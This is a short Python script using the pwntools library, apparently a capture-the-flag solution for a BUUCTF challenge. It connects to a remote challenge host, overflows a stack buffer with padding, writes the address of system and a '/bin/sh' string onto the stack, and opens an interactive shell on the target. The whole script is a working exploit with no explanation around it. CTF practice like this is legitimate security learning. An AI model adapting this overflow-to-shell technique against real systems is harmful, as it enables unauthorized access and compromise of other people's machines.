from pwn import *

sh= remote("node5.buuoj.cn",28493)
sh.recvuntil('Input:')
system_add=0x8048320
binsh_add=0x804A024
payload=b'a'*(0x88+0x4)+p32(system_add)+p32(1)+p32(binsh_add)
sh.sendline(payload)

sh.interactive()
